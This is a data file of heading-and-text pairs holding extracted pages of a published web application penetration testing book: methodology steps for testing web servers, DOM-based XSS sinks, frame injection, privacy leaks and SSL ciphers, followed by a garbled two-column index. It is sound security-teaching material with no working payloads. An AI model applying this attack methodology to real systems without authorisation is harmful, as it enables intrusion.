running within it.\n10.1.3. If you are able to achieve command execution, SQL injection, or arbi-\ntrary file access within one application, investigate carefully whether\nthis provides any means of escalating your attack to target other\napplications."
  },
  {
    "input": "11. Test for Web Server Vulnerabilities",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 721\nChapter 20 ■ A Web Application Hacker’s Methodology 721\n10.2. Test Segregation between ASP-Hosted Applications\n10.2.1. If the application belongs to an ASP-hosted service that comprises a\nmix of shared and customized components, identify any shared com-\nponents such as logging mechanisms, administrative functions, and\ndatabase code components, and attempt to leverage these to compro-\nmise the shared portion of the application, and thereby attack other\nindividual applications.\n10.2.2. If a common database is used within any kind of shared environ-\nment, perform a comprehensive audit of the database configuration,\npatch level, table structure, and permissions, using a database scan-\nning tool like NGSSquirrel. Any defects within the database security\nmodel may provide a means of escalating an attack from within one\napplication to another.\n11. Test for Web Server Vulnerabilities\n11.1. Test for default credentials\n11.2. Test for default content\n11.3. Test for dangerous HTTP methods\n11.4. Test for proxy functionality\n11.5. Test for virtual hosting misconfiguration\n11.6. Test for web server software bugs\nFigure20-12: Testing for web server vulnerabilities\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 722\n722 Chapter 20 ■ A Web Application Hacker’s Methodology\n11.1. Test for Default Credentials\n11.1.1. Review the results of your application mapping exercises to identify\nthe web server and other technologies in use that may contain acces-\nsible administrative interfaces.\n11.1.2. Perform a port scan of the web server to identify any administrative\ninterfaces running on a different port than the main target application.\n11.1.3. For any identified interfaces, consult the manufacturer’s documen-\ntation and common default password listings to obtain default\ncredentials.\n11.1.4. If the default credentials do not work, use the steps listed in Section 4\nto attempt to guess valid credentials.\n11.1.5. If you gain access to an administrative interface, review the available\nfunctionality and determine whether this can be used to further com-\npromise the host and attack the main application.\n11.2. Test for Default Content\n11.2.1. Review the results of your Nikto scan (step 1.4.1) to identify any\ndefault content that may be present on the server but not an integral\npart of the application.\n11.2.2. Use search engines and other resources to identify default content\nand functionality included within the technologies you know to be in\nuse. If feasible, carry out a local installation of these and review them\nfor any default functionality that you may be able to leverage in your\nattack.\n11.2.3. Examine the default content for any functionality or vulnerabilities\nthat you may be able to leverage to attack the server or the application.\n11.3. Test for Dangerous HTTP Methods\n11.3.1. Use the OPTIONSmethod to list the HTTP methods that the server\nstates are available. Note that different methods may be enabled in\ndifferent directories. You can perform a vulnerability scan in Paros to\nperform this check for you.\n11.3.2. Try each reported method manually to confirm whether it can in fact\nbe used.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 723\nChapter 20 ■ A Web Application Hacker’s Methodology 723\n11.3.3. If you find that some WebDAV methods are enabled, use a WebDAV-\nenabled client for further investigation, such as Microsoft FrontPage\nor the Open as Web Folder option within Internet Explorer.\n11.4. Test for Proxy Functionality\n11.4.1. Using both GETand CONNECTrequests, try to use the web server as a\nproxy to connect to other servers on the Internet, and retrieve content\nfrom them.\n11.4.2. Using both techniques, attempt to connect to different IP addresses\nand ports within the hosting infrastructure.\n11.4.3. Using both techniques, attempt to connect to common port numbers\non the web server itself, by specifying 127.0.0.1 as the target host in\nthe request.\n11.5. Test for Virtual Hosting Misconfiguration\n11.5.1. Submit GETrequests to the root directory using the following:\n■■ The correct Hostheader.\n■■ A bogus Hostheader.\n■■ The server’s IP address in the Hostheader.\n■■ No Hostheader (use HTTP/1.0 only).\n11.5.2. Compare the responses to these requests. A common result is that\ndirectory listings are obtained when the server’s IP address is used in\nthe Hostheader. You may also find that different default content is\naccessible.\n11.5.3. If different behavior is observed, repeat the application mapping\nexercises described in step 1 using the hostname that generated dif-\nferent results. Be sure to perform a Nikto scan using the -vhost\noption, to identify any default content that may have been over-\nlooked during initial application mapping.\n11.6. Test for Web Server Software Bugs\n11.6.1. Run Nessus and any other similar scanners you have available, to\nidentify any known vulnerabilities in the web server software you\nare attacking."
  },
  {
    "input": "12. Miscellaneous Checks",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 724\n724 Chapter 20 ■ A Web Application Hacker’s Methodology\n11.6.2. Review resources such as Security Focus, Bugtraq, and Full Disclo-\nsure to find details of any recently discovered vulnerabilities that\nmay not have been fixed on your target.\n11.6.3. If the application was developed by a third party, investigate\nwhether it ships with its own web server (often an open source\nserver), and if so, investigate this for any vulnerabilities. Be aware\nthat in this case, the server’s standard banner may well have been\nmodified.\n11.6.4. If possible, consider performing a local installation of the software\nyou are attacking, and carry out your own testing to find new vul-\nnerabilities that have not been discovered or widely circulated.\n12. Miscellaneous Checks\n12.1. Test for DOM-based attacks\n12.2. Test for frame injection\n12.3. Test for local privacy vulnerabilities\n12.4. Follow up information leakage\n12.5. Test for weak SSL ciphers\nFigure20-13: Miscellaneous checks\n12.1. Check for DOM-Based Attacks\n12.1.1. Perform a brief code review of every piece of JavaScript received\nfrom the application to identify any XSS or redirection vulnerabilities\nthat can be triggered by using a crafted URL to introduce malicious\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 725\nChapter 20 ■ A Web Application Hacker’s Methodology 725\ndata into the DOM of the relevant page. Include all standalone\nJavaScript files and scripts contained within HTML pages (both static\nand dynamically generated).\n12.1.2. Identify all uses of the following APIs, which may be used to access\nDOM data that is controllable via a crafted URL:\ndocument.location\ndocument.URL\ndocument.URLUnencoded\ndocument.referrer\nwindow.location\n12.1.3. Trace the relevant data through the code to identify what actions are\nperformed with it. If the data (or a manipulated form of it) is passed\nto one of the following APIs, then the application may be vulnerable\nto XSS:\ndocument.write()\ndocument.writeln()\ndocument.body.innerHtml\neval()\nwindow.execScript()\nwindow.setInterval()\nwindow.setTimeout()\n12.1.4. If the data is passed to one of the following APIs, then the applica-\ntion may be vulnerable to a redirection attack:\ndocument.location\ndocument.URL\ndocument.open()\nwindow.location.href\nwindow.navigate()\nwindow.open()\n12.2. Check for Frame Injection\n12.2.1. If the application uses frames, review the HTML source of the main\nbrowser window, which should contain the code for the frameset.\nLook for <frame>tags which contain a name attribute. If any are\nfound, then the application is potentially vulnerable to frame injection.\n12.2.2. If the names used for frames appear to be highly cryptic or random,\naccess the application several times from different browsers, and\nreview whether the frame names change. If they do, and there is no\nway to predict the names of other users’ frames, then the application\nis probably not vulnerable.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 726\n726 Chapter 20 ■ A Web Application Hacker’s Methodology\n12.3. Check for Local Privacy Vulnerabilities\n12.3.1. Review the logs created by your intercepting proxy to identify all the\nSet-Cookiedirectives received from the application during your\ntesting. If any of these contains an expiresattribute with a date that\nis in the future, the cookie will be stored by users’ browsers until that\ndate. Review the contents of any persistent cookies for sensitive data.\n12.3.2. If a persistent cookie is set that contains any sensitive data, then a\nlocal attacker may be able to capture this data. Even if the data is\nencrypted, an attacker who captures it will be able to resubmit the\ncookie to the application, and gain access to any data or functionality\nthat this allows.\n12.3.3. If any application pages containing sensitive data are accessed over\nHTTP, look for any cache directives within the server’s responses. If\nany of the following directives do not exist (either within the HTTP\nheaders or within HTML meta-tags), then the page concerned may\nbe cached by one or more browsers:\nExpires: 0\nCache-control: no-cache\nPragma: no-cache\n12.3.4. Identify any instances within the application in which sensitive data\nis transmitted via a URL parameter. If any cases exist, examine the\nbrowser history to verify that this data has been stored there.\n12.3.5. For all forms that are used to capture sensitive data from the user\n(such as credit card details), review the HTML source for the form. If\nthe attribute autocomplete=offis not set, either within the form tag\nor the tag for the individual input field, then data entered will be\nstored within browsers that support autocomplete provided that the\nuser has not disabled this.\n12.4. Follow Up Any Information Leakage\n12.4.1. In all of your probing of the target application, monitor its responses\nfor error messages that may contain useful information about the\ncause of the error, the technologies in use, and the application’s inter-\nnal structure and functionality.\n12.4.2. If you receive any unusual error messages, investigate these using\nstandard search engines. You can use various advanced search fea-\ntures to narrow down your results. For example:\n\"unable to retrieve\" filetype:php\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 727\nChapter 20 ■ A Web Application Hacker’s Methodology 727\n12.4.3. Review the search results, looking both for any discussion about the\nerror message and for any other web sites in which the same mes-\nsage has appeared. Other applications may produce the same mes-\nsage in a more verbose context, enabling you to better understand\nwhat kind of conditions give rise to the error. Use the search engine\ncache to retrieve examples of error messages that no longer appear\nwithin the live application.\n12.4.4. Use Google code search to locate any publicly available code that\nmay be responsible for a particular error message. Search for snip-\npets of error messages that may be hard-coded into the application’s\nsource code. You can also use various advanced search features to\nspecify the code language and other details, if these are known. For\nexample:\nunable\\ to\\ retrieve lang:php package:mail\n12.4.5. If you receive error messages with stack traces containing the names\nof library and third-party code components, search for these names\non both types of search engine.\n12.5. Check for Weak SSL Ciphers\n12.5.1. If the application uses SSL for any of its communications, use the tool\nTHCSSLCheck to list the ciphers and protocols supported.\n12.5.2. If any weak or obsolete ciphers and protocols are supported, then a\nsuitably positioned attacker may be able to perform an attack to\ndowngrade or decipher the SSL communications of an application\nuser, gaining access to their sensitive data.\n12.5.3 Some web servers advertise certain weak ciphers and protocols as\nsupported but refuse to actually complete a handshake using these if\na client requests them. This can lead to false positives when using the\nTHCSSLCheck tool. You can use the Opera browser to attempt to\nperform a complete handshake using specified weak protocols, to\nconfirm whether these can actually be used to access the application.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 728"
  },
  {
    "input": "Index",
    "output": "70779bindex.qxd:WileyRed 9/14/07 3:16 PM Page 729\nIndex\n302 Found, 68 vulnerabilities hidden content and, 670–671\n400 Bad Request, 69 finding, 455–456 identifier-specified functions,\n403 Forbidden, 69 preventing, 456–457 671–672\n401 Unauthorized, 69 administrators, alerting, 30–31 public resources and, 670\n500 Internal Server Error, 69 AJAX (Asynchronous JavaScript test for debug parameters,\nand XML), 54, 389–390 672\nleveraging, 461–463 visible content, 669–670\nA asynchronous off-site arbitrary redirection, 583–584\nrequests, 463–464 testing for, 706\naccess controls, 18–19, 217\nalerting administrators, 30–31 architecture, tiered, 535–536\nattacking, 224–228\nAlibaba, 568 applying defense in depth, 542\nbroken, 6\nAllaire JRun directory listing attacking tiers, 539–540\nhorizontal, 218\nvulnerability, 569 exploiting trust relationships\ninsecure methods, 223–224\nanalyzing applications between tiers, 537–538\nsecuring, 228–234\nidentifying data entry points, minimizing trust relationships,\ntesting\n673 540–541\ninsecure access control\nidentifying functionality, 673 segregating different\nmethods, 698\nidentifying the technologies components, 541–542\nlimited access, 697–698\nused, 673–674 subverting tiers, 538–539\nmultiple accounts, 697\nmapping attack surface, 674 archives, hidden content and, 73\nrequirements, 696–697\nanti-DNS pinning, 464–466 ASP, code injection and, 302–303\nvertical, 218\nDNS pinning, 466 ASP.NET, 50\nvulnerabilities, 218–219\nattacks against, 466–467 APIs, dangerous, 596–600\nidentifier-based functions,\nApache, chunked encoding environment, configuring,\n220–221\noverflow, 567 600–601\ninsecure access control\napplication pages, functional session interaction, 595–596\nmethods, 223–224\npaths and, 76–78 user-supplied data, identifying,\nmultistage functions, 222\napplication service providers. See 594–595\nstatic files, 222–223\nASPs ViewState, 102–106\nunprotected functionality,\napplications ASPs (application service\n219–220\nanalyzing providers), 542–543\nAccipiter DirectServer, 568\nidentifying data entry points, shared application services,\nActiveX controls, 119–120\n673 543–544\nattacking, 454–455\nidentifying functionality, 673 attack surfaces, 91–92\nexported functions, 122\nidentifying the technologies attackers\ninputs processed by controls,\nused, 673–674 alerting administrators, 30–31\n123–124\nmapping the attack surface, audit logs and, 29–30\nmanaged code, decompiling,\n674 error handling, 27–29\n123–124\nmapping content reacting to attacks, 31–32\nreverse engineering, 120–122\ndefault content and, 671 audit logs, 29–30\n729\n70779bindex.qxd:WileyRed 9/14/07 3:16 PM Page 730\n730 Index ■ A–C\nauthentication, 16–17 multistage mechanisms, bypassing filters\nACEGI, 49 686–687 blocked characters, 267\nbroken, 6 password quality, 680 blocked strings, 268\ndesign flaws predictability of auto-generated circumventing validation, 267\nbrute-forcible login, 136–138 credentials, 684 defective filters, 269–270\nincomplete credential remember me function, 682–683 dynamic execution, 268–269\nvalidation, 152 resilience to password SQL comments, 268\ninsecure distribution of guessing, 681 bypassing login, injecting into\ncredentials, 155 understanding mechanism, 680 SQL, 243–244\npasswords, 135–136 username enumeration,\npasswords, change 680–681\nfunctionality, 144–145 username uniqueness, 683–684 C\npasswords, forgotten autocomplete, 460\ncached web content, 458–459\nfunctionality, 145–147\ncanonicalization, 26–27\npasswords, predictable initial,\nvulnerabilities, web server,\n154–155 B\n568–571\nremember me functionality,\nbackdoor passwords, 584–585 capturing user data\n148–149\nbanner grabbing, 82 HTML forms\nuser impersonation\nBase64 encoding, 58 disabled elements, 110–111\nfunctionality, 149–151\nBasic authentication, HTTP, 47 length limits, 106–108\nusernames, non-unique,\nbespoke automation script-based validation,\n152–153\nattack scripting, 476–477 108–110\nusernames, predictable, 154\nBurp Intruder, 491–501 thick-client components,\nverbose failure messages,\nenumerating identifiers 111–112\n139–141\napproach, 474 ActiveX controls, 119–124\nvulnerable transmission of\nhit detection, 474–476 Java applets, 112–119\ncredentials, 142–143\nHTTP status code, 474 Shockwave Flash Objects,\nHTTP, 47, 178–179\nlocation header, 475 124–128\nimplementation flaws\nresponse body, 475 circumventing validation,\nfail-open login mechanism,\nresponse length, 475 bypassing filters and, 267\n156–157\nset-cookie header, 475 Cisco ACS Acme.server, 568\ninsecure storage of\ntime delays, 476 client, transmitting data via,\ncredentials, 161\nfuzzing and, 487–491 95–96\nmultistage login mechanisms,\nharvesting data, 484–487 ASP.NET ViewState, 102–106\ndefects, 157–161\nJAttack, 477–483 form fields, hidden, 96–98\nJAAS, 49\nuses for, 472–473 HTTP cookies, 99\nsecuring\nblack-box testing, 578–579 opaque data, 101–102\naccount recovery function,\nblocked characters, bypassing Referer header, 100–101\n170–171\nfilters and, 267 URL parameters, 99–100\nbrute-force attack prevention,\nblocked strings, bypassing filters client-side attack, escalating\n167–169\nand, 268 attack other network hosts, 398\ncredentials, handling\nboundary validation, 23–25 capturing clipboard contents,\nsecretively, 163–164\nbrowsing history, 459 396\ncredentials, strong, 162–163\nbrute-forcible login, 136–138 enumerating currently used\ncredentials, validating,\nbuffer overflows applications, 397\n164–166\ndetecting vulnerabilities, exploit browser vulnerabilities,\ninformation leakage\n527–528 399\nprevention, 166–167\nheap overflows, 523–524 logging keystrokes, 396\nlog, 172\noff-by-one vulnerabilities, port scanning local network,\nmonitor, 172\n524–527 397–398\nnotify, 172\nstack overflows, 522–523 stealing history and search\npassword change function,\nvulnerabilities, 585–586 queries, 396\n170\nweb server vulnerabilities, client-side controls, testing\nsmartcards and, 176\n566–567 client-side controls over user\ntechnologies, 134–135\nBurp Intruder, 69, 491–492 input, 676\nauthentication mechanism,\napplication fuzzing, 500–501 thick-client components,\ntesting\nenumerating identifiers, 677–679\naccount recovery function, 682\n495–498 transmission of data via client,\ncheck for unsafe distribution of\nharvesting information, 675–676\ncredentials, 685\n498–500 client-side data\ncheck for unsafe transmission\npayloads alerting, 131\nof credentials, 684–685\nchoosing, 493–494 logging, 131\nexploit any vulnerabilities to\npositioning, 492–493 transmitting data via client,\ngain unauthorized access,\nresponse analysis, 494–495 128–129\n687–688\nBurp Proxy, 97, 105 validating client-generated\nimpersonation function, 683\nBurp Spider, 62 data, 129–130\nlogic flaws, 685–686\nBurp Suite, 643–644 client-side information leakage,\n517\n70779bindex.qxd:WileyRed 9/14/07 3:16 PM Page 731\nIndex ■ C–E 731\nclipboard, capturing contents, flaws, 320–321 DELETE statements (SQL), code\n396 preventing, 321 injection, 250\ncode, tools for browsing, 619–620 subverting application logic, design flaws in authentication\ncode injection, 237 317–318 mechanisms\nbypassing filters code review brute-forcible login, 136–138\nblocked characters, 267 black-box testing, 578–579 incomplete credential\nblocked strings, 268 methodology, 579–580 validation, 152\ncircumventing validation, 267 white-box testing, 578–579 insecure distribution of\ndefective filters, 269–270 command injection, SMTP, credentials, 155\ndynamic execution, 268–269 323–324 passwords, 135–136\nSQL comments, 268 comments, source code, 586–587 change functionality, 144–145\ncompiled languages, 238 common functions of web forgotten functionality,\nfingerprinting database, applications, 3–4 145–147\n255–256 COMRaider, 122 predictable initial, 154–155\ninference, 277–278 configuration remember me functionality,\nAbsinthe, 278–282 vulnerable 148–149\nconditional errors, 282–283 default content, 555–558 user impersonation\ntime delays, 283–285 default credentials, 554–555 functionality, 149–151\ninterpreted languages, 238–239 web server, securing, 565–566 usernames\nLDAP, 326–327 content, default, 555–558 non-unique, 152–153\nflaws, 329–330 Cookie header, HTTP request, 37 predictable, 154\nmodifying search filter, cookies verbose failure messages,\n328–329 domain restrictions, 203–205 139–141\npreventing, 330 HTTP, 43–44, 99 vulnerable transmission of\nquery attributes, 327–328 path restrictions, 205–206 credentials, 142–143\nODBC error messages, 262–266 persistent, 458 Digest authentication, HTTP, 47\nOS command scope, 695–696 directory listings, web server,\nASP and, 302–303 session tokens and, 178 559–560\ninjection flaws, 304–307 credentials directory names, 86\nPerl and, 300–302 default, 554–555 DOM-based attacks, checking for,\npreventing, 307 incomplete validation, 152 724–725\nout-of-band channels, 274–275 insecure distribution, 155 DOM-based XSS vulnerabilities,\nMS-SQL, 275 insecure storage, 161 386–388\nMySQL, 276–277 vulnerable transmission, domain restrictions, cookies,\nOracle, 275–276 142–143 203–205\nretrieving data as numbers, cross-site scripting, 580–581. See dynamic execution, bypassing\n273–274 XSS (cross-site scripting) filters and, 268–269\nsecond-order SQL injection, custom, scripts, Stunnel, 663–664\n271–272\nSMTP, 321–322 E\ncommand injection, 323–324 D\nEJB (Enterprise Java Bean), 49\nemail header manipulation,\ndata handling, safe, 22–23 elements, HTML forms, disabled,\n322–323\ndata sanitization, 22 110–111\nflaws, 324–325\ndatabase error messages, 510 email, XSS attacks and, 388\npreventing, 325–326\nDatabase object relational encoding\nSOAP, 313–316\nmapping, Hibernate, 49 Base64, 58\nSQL, 240–241\ndatabases hex, 59\nbugs, 244–247\nattacking HTML, 57–58\nbypassing login, 243–244\nMS-SQL and, 286–287 Unicode, 57\nDELETE statements, 250\nMySQL and, 288–289 URL, 56\nexploiting basic vulnerability,\nOracle and, 288 vulnerabilities, web server,\n241–243\ncode components 568–571\nINSERT statements, 248–249\ncalls to dangerous functions, Enterprise Java Bean (EJB), 49\npreventing, 296–300\n618–619 entry points for user input,\nSELECT statements, 248\nSQL injection, 617–618 identifying, 80–81\nUNION operator, 250–255\ndata extraction enumeration, identifiers, bespoke\nUPDATE statements, 249–250\nMS-SQL, 260–262 automation and, 472, 473–483\nweb scripting languages\nOracle, 257–260 environments, shared\ndynamic execution\nfingerprinting, code injection attacking, 544–549\nvulnerabilities, 307–310\nand, 255–256 securing, 549–551\nfile inclusion vulnerabilities,\ndebug messages, 508–509 ERP (enterprise planning)\n310–312\ndebugging software, 4\nscript injection\nbreakpoint, 121 error handling, 27–29\nvulnerabilities,\nfunctionality, 555–556 error messages, 505–506\npreventing, 312\nOllyDbg, 120 database messages, 509–511\nXPath, 316–317\ndefective filters, bypassing filters debug messages, 508–509\nblind, 319–320\nand, 268–269\n70779bindex.qxd:WileyRed 9/14/07 3:16 PM Page 732\n732 Index ■ E–I\nengineering informative, hidden content, discovering, 67 I\n512–513 brute-force, 67–70\nidentifier-based functions,\ninformation leakage and, inference, 70–72\n220–221\n516–517 leveraging the web server,\nidentifiers, enumerating, bespoke\npublic information, 511–512 75–76\nautomation and, 472, 473–483\nscript error messages, 506–507 public information, use of,\nimplementation flaws\nserver messages, 509–511 72–74\nfail-open login mechanism,\nstack traces, 507–508 hidden parameters, 79\n156–157\nexported functions, 122 hijacking, session tokens, client\ninsecure storage of credentials,\nexposure to, 201–202\n161\nhistory, stealing, 396\nmultistage login mechanisms,\nF horizontal access controls, 218\ndefects, 157–161\nhorizontal privilege escalation,\nfail-open login mechanism, incomplete credential validation,\n218\n156–157 152\nHost header, HTTP request, 37\nfailure messages, verbose, inference, 514–516\nhosting\n139–141 information leakage, 6\nshared, 542–543\nfields, hidden in forms, 96–98 follow up, 726–727\nvirtual hosting, 543\nfile extensions, 84–86 preventing\nHTML (hypertext markup\nfile inclusion, testing for, 711 generic error messages,\nlanguage), 51\nfiles, static, 222–223 516–517\nencoding, 57–58\nfingerprinting database, code minimizing client-side, 517\nforms\ninjection and, 255–256 protecting sensitive\ndisabled elements, 110–111\nFirefox, 624–626 information, 517\nlength limits, 106–108\nFlash VM, 125 initial passwords, predictable,\nparsing, 62\nformat string vulnerabilities, 154–155\nscript-based validation,\n531–532, 586 injecting code. Seecode injection\n108–110\ndetecting, 532–533 input, validation, 23–25\nHTTP authentication, 178–179\nforms, 52–53 input-based vulnerabilities,\nHTTP cookies, 99\nfields, hidden, 96–98 testing for\nHTTP fingerprinting, 82–83\nHTML, length limits, 106–108 file inclusion, 711\nHTTP header injection, 705–706\nparsing, web spidering, 62 fuzz all request parameters,\nHTTP response splitting,\nframe injection, 438–439 699–702\n436–438\nchecking for, 725 OS command injection, 707–708\ninjecting cookies, 435–436\nexploiting, 439–440 path traversal, 709–710\nvulnerabilities\npreventing, 440 script injection, 711\nexploiting, 434–438\nfunction-specific input SQL injection, 702–704\npreventing, 434–438\nvulnerabilities, testing for XSS injection, 704–707\nHTTP (Hypertext Transfer\nLDAP injection, 715–716 input handling\nProtocol), 4–5, 35–36\nnative software vulnerabilities, accept known good, 21–22\nauthentication, 47\n713–714 reject known bad, 21\ncookies, 43–44\nSMTP injection, 712–713 safe data handling, 22–23\nheaders\nSOAP injection, 715 sanitization, 22\ngeneral, 41\nXPath injection, 716–717 semantic checks, 23\nrequest, 41–42\nfunctions insecure distribution of\nresponse, 42\nexported, 122 credentials, 155\ntamper-proof, 101\nidentifier-based, 220–221 insecure storage of credentials,\nHTTPS, 45–46\nmultistage, 222 161\nmethods\nweb server configuration, INSERT statements (SQL), code\nGET, 38\n557–558 injection and, 248–249\nHEAD, 39\nfuzzing, bespoke automation integer overflows, 529\nOPTIONS, 40\nand, 472, 487–491 integer vulnerabilities, 586\nPOST, 39\ndetecting, 530–531\nPUT, 40\ninteger overflows, 529\nTRACE, 39–40\nG signedness errors, 529–530\nproxies, 46\nintegrated testing suites, 627–628\nGET method, HTTP, 38 requests, 36–37\napplication fuzzers and\ngetObsScore method, 112–113 headers, 41–42\nscanners, 636–637\nReferer header, 99–100\nBurp Suite, 643–644\nresponses, 37–38\nH headers, 42 feature comparison, 640–643\nintercepting proxies\nharvesting data, bespoke status codes, 44–45 alternatives to, 646–647,\nautomation and, 472, 484–487 URLs, 40–41 646–648\nHEAD method, HTTP, 39 HTTP methods, web server, browser configuration,\nheap overflows, 523–524 560–562 628–629\nhex encoding, 59 Hydra, 660 common features, 631–633\nHibernate, Database object hyperlinks, 51–52 intercepting proxies and\nrelational mapping, 49 HTTPS, 629–631\n70779bindex.qxd:WileyRed 9/14/07 3:16 PM Page 733\nIndex ■ I–P 733\nTamper Data, 647–648 cookies, persistent, 458 minimizing client-side\nTamperIE, 647–648 preventing, 460–461 information leakage, 517\nmanual request tools, 637–639 local privacy vulnerabilities, multistage functions, 222\nshared functions and utilities, checking for, 726 multistage login mechanisms,\n639–640 logging, 131 defects in, 157–161\nParos, 644–645 Log4J, 49 multistep validation, 26–27\nweb application spiders, 633–636 session token disclosure, MySpace, XSS attack, 388\nWebScarab, 645–646 196–198\nintercepting server responses, 107 logic flaws\nInternet Explorer, 624 abusing a search function N\ninterpreted languages, code example, 365–366\nnative software bugs\ninjection and, 238–239 avoiding, 370–372\nbuffer overflow vulnerabilities,\niPlanet search overflow, 567 beating a business limit\n585–586\nISAPI extensions, 567 example, 360–362\nformat string vulnerabilities,\nbreaking the bank example,\n586\n356–359\ninteger vulnerabilities, 586\nJ cheating on bulk discounts\nnative software vulnerabilities,\nexample, 362–363\nJAR (Java ARchive) files, 116 testing for\nerasing an audit trail example,\nJAttack, 477–483 buffer overflows, 713\n359–360\nJava format string vulnerabilities,\nescaping from escaping\nAPIs, dangerous, 589–592 714\nexample, 363–364\nbytecode integer vulnerabilities, 714\nfooling password change\ndecompiling, 114–117 networks\nfunction example, 351–352\nobfuscation, 117–119 hosts, attacking, 398\nnature of, 350\nenvironment, configuring, port scanning, 397–398\nproceeding to checkout\n593–594 session token disclosure,\nexample, 352–354\nsession interaction, 589 192–195\nracing against the login,\nuser-supplied data, identifying, Nikto, 660\n368–370\n587–589 non-unique usernames, 152–153\nrolling your own insurance\nweb containers, 49 NTLM authentication, HTTP, 47\nexample, 354–356\nJava applets, JAR files, 116\nsnarfing debug messages\nJava Platform, Enterprise Edition,\nexample, 366–368\n49–50 O\ntesting for\nJava Servlets, 49\nhandling of incomplete input, ODBC error messages, 262–263\nJavaScript, 54, 616–617\n718–719 column names, enumerating,\nJSON (JavaScript Object\nkey attack surface, 717 263–265\nNotation), 446\nmultistage processes, 718 extracting arbitrary data, 265\nattacks against\ntransaction logic, 719–720 recursion, 266\nimplementing callback\ntrust boundaries, 719 table names, enumerating,\nfunction, 448–449\nlogin 263–265\noverriding array constructor,\nbrute-forcible, 136–138 off-by-one vulnerabilities,\n447–448\nbypassing, 243–244 524–527\nhijacking, 446–447\nfail-open login mechanism, OllyDbg, 120\npreventing, 450\n156–157 opaque data, 101–102\nvulnerabilities, 449\nmultistage login mechanisms, Opera, 626–627\ndefects in, 157–161 OPTIONS method, HTTP, 40\nsessions and, 176 Oracle PL/SQL exclusion list\nK\nLog4J, logging, 49 bypasses, 570–571\nkeystrokes, logging, 396 OS command injection, 584\ntesting for, 707–708\nM OS commands, code injection,\nL 300–307\nmapping, session tokens, 198–200\nLDAP mapping application content\ncode injection, 326–327 default content and, 670–671\nP\nflaws, 329–330 hidden content and, 670–671\nmodifying search filter, identifier-specified functions, parameters, URL parameters,\n328–329 671–672 99–100\npreventing, 330 public resources and, 670 Paros, 62, 97, 644–645\nquery attributes, 327–328 test for debug parameters, 672 parsing, HTML forms, web\ninjection, testing for, 715–716 visible content and, 669–670 spidering, 62\nlocal network, port scanning, McAfee Epolicy Orcestrator, 568 passwords\n397–398 Microsoft IIS backdoor, 584–585\nlocal privacy attacks ISAPI extensions, 567 bad, 135–136\nautocomplete, 460 Unicode path traversal change functionality, 144–145\nbrowsing history, 459 vulnerabilities, 569–570 forgotten functionality, 145–147\ncached web content, 458–459 WebDav overflow, 567 initial, predictable, 154–155\n70779bindex.qxd:WileyRed 9/14/07 3:16 PM Page 734\n734 Index ■ P–S\npath traversal, 582–583 request forgery, 440–441 check for insecure transmission\ntesting for, 709–710 OSRF (on-site request forgery), of tokens, 691–692\nvulnerabilities 441–442 check for session fixation, 694\ncircumventing obstacles to XSRF (cross-site request 7check for XSRF, 694–695\nattacks, 339–343 forgery), 442–446 check mapping of tokens to\ncommon, 333–334 flaws, exploiting, 443–444 sessions, 692–693\ncustom encoding, 342–343 flaws, preventing, 444–446 test session termination,\ndetecting, 336–339 reverse engineering, 120–122 693–694\nexploiting, 344 robots.txt, 62 testing tokens for meaning,\npreventing, 344–346 689–690\ntargets for attack, locating, testing tokens for predictability,\n335–336 S 690–691\nweb server, 568 understanding mechanism, 689\nsafe data handling, 22–23\nper-page tokens, 211 session termination, testing,\nsame origin policy, 381\nPerl, 611–612 693–694\nsample functionality, 556–557\nAPIs, dangerous, 613–615 session tokens, 86\nsanitizing input, 22\ncode injection and, 302–303 concurrent logins, 209\nscript-based validation, 108–110\nenvironment, configuring, disclosure in logs, 196–198\nscript injection, testing for, 711\n615–616 disclosure on network, 192–195\nscripting, cross-site, 6\nsession interaction, 613 generation, weaknesses in,\nscripts, custom, 661–662\nuser-supplied data, identifying, 180–191\nCurl, 662–663\n612 handling, weaknesses in,\nNetcat, 663\nphishing scams, 383 191–192\nWget, 662\nPHP, 50–51 hijacking, client exposure to,\nsearch engines, hidden content\nAPIs, dangerous, 604–609 201–202\nand, 72\nenvironment, configuring, logout functionality, 209\nsearch queries, stealing, 396\n609–611 mapping, 198–200\nsecurity, 5\nsession interaction, 603 meaningful, 180–182\nfuture of, 12\nuser-supplied data, identifying, per-page, 211\nproblem factors, 9–10\n601–603 predictable, 182–183\nSELECT statements (SQL), code\nPOJO (Plain Old Java Object), 49 concealed sequences, 184–185\ninjection and, 248\nport scanning network, 397–398 random number generation,\nsemantic checks, 23\nPOST method, HTTP, 39 187–191\nsensitive information, protecting,\nPragma header, HTTP response, time dependency, 185–187\n517\n38 SSL and, 192\nserver error messages, 509\npredictable initial passwords, structured, 181\nServer header, HTTP response, 38\n154–155 transmitting to URL, 209\nserver responses, intercepting,\nPresentation layer sessionless state mechanisms, 179\n107\nSiteMesh, 49 sessions, 55, 176\nserver-side functionality\nTapestry, 49 alternatives to, 178–180\napplication behavior, 90–91\nprotecting sensitive information, HTTP authentication and,\nrequests, 88–90\n517 178–179\nserver-side technologies\nproxies identifiers, 177\nbanner grabbing, 82\nHTTP, 46 login, 176\ndirectory names and, 86\nweb servers as, 562–564 sessionless state mechanisms,\nfile extensions and, 84–86\npublic information, error 179\nHTTP fingerprinting, 82–83\nmessages, 511–512 termination, 200–201\nsession tokens and, 86\npublished information, tokens, 177\nthird-party code components\ngathering, 513–514 cookies and, 178\nand, 87–88\nPUT method, HTTP, 40 Set-Cookie header, HTTP\nsession fixation, 450–452, 694\nresponse, 38, 203\nvulnerabilities\nshared application services,\nfinding and exploiting,\nR 543–544\n452–453\nshared environments\nredirection attacks, 428 preventing, 453–454\nattacking\nabsolute prefix, 432 session management, 17–18,\nattacks against mechanisms,\nblocking absolute URLs, 431 175–176\n545–546\nvulnerabilities alerts, 211–212\nattacks between applications,\nfinding and exploiting, logging, 211–212\n546–549\n429–433 monitoring, 211–212\nsecuring\npreventing, 433–434 securing\nsecure customer access,\nReferer header, HTTP request, 37, strong tokens, 206–208\n549–550\n99–100 token protection, 208–211\nsegregating components in\nreflected request parameters, 704 session management mechanism,\nshared application, 551\nreflected XSS, 379, 705 testing, 688\nsegregating customer\nremember me functionality, check cookie 